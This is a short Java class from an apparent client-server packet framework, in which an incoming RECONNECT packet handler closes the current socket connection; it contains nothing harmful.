package com.redpois0n.packets.in;

import com.redpois0n.Connection;

public class PacketRECONNECT extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.socket.close();
	}

}
